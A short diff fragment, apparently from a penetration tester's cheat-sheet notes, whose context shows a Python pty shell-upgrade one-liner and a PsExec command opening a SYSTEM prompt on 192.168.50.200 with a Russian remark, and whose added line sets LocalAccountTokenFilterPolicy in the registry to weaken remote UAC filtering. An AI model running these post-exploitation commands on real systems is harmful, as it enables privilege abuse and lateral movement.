@@ -46,3 +46,5 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 
 Psexec -i \\192.168.50.200 -u administrator -s cmd.exe Привелигерованный режим...
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
